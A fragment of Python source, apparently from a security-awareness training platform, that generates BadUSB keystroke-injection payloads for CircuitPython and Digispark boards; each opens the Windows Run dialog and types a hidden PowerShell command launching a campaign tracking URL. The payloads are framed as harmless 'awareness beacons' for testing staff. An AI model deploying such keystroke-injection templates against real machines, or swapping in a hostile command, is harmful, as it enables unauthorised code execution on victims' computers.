# Press Win + R to open Run dialog
kbd.press(Keycode.GUI, Keycode.R)
kbd.release_all()
time.sleep(0.6)

# Inject safe PowerShell awareness beacon command
cmd = "powershell -WindowStyle Hidden -NoProfile -Command \"Start-Process '{target_url}'\""
layout.write(cmd)
time.sleep(0.2)

# Execute command
kbd.press(Keycode.ENTER)
kbd.release_all()
"""

    # 3. Digispark ATtiny85 (Arduino .ino)
    digispark_arduino = f"""/*
 * ==============================================================================
 * [HUMINT SHIELD] Digispark ATtiny85 - USB HID Training Sketch
 * Hardware: Digispark ATtiny85 (USB Development Board)
 * Compiler: Arduino IDE (Digistump AVR Boards)
 * ==============================================================================
 */
#include "DigiKeyboard.h"

void setup() {{
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1500);

  // Press Win + R
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);

  // Type hidden awareness beacon command
  DigiKeyboard.print(F("powershell -WindowStyle Hidden -NoProfile -Command \"Start-Process '{target_url}'\""));
  DigiKeyboard.delay(200);

  // Press Enter
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}}

void loop() {{
  // One-time execution
}}
"""

    return {
        "success": True,
        "campaign_id": str(campaign.id),
        "tracking_uuid": tracking_uuid,
        "organization_name": org_name,
        "target_url": target_url,
        "ducky_script": ducky_script,
        "pico_circuitpython": pico_circuitpython,
        "digispark_arduino": digispark_arduino,
    }


__all__ = ["router"]

